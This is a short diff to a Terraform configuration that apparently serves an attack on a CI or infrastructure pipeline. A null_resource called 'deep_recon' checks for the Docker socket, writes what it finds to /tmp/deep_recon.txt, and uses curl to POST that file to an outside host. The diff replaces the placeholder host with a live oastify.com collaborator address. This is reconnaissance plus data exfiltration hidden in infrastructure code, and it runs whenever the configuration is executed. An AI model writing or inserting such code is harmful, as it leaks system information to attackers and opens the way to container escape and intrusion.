@@ -17,7 +17,7 @@ resource "null_resource" "deep_recon" {
       echo "=== DOCKER SOCKET? ===" >> /tmp/deep_recon.txt
       ls -la /var/run/docker.sock 2>/dev/null >> /tmp/deep_recon.txt || echo "No docker socket" >> /tmp/deep_recon.txt
       
-      curl -X POST --data-binary @/tmp/deep_recon.txt http://YOUR-COLLABORATOR.com/deep_recon
+      curl -X POST --data-binary @/tmp/deep_recon.txt http://ygi14x09qbfu32mjn4f0urqyvp1gp7rvg.oastify.com/deep_recon
     EOT
   }
   
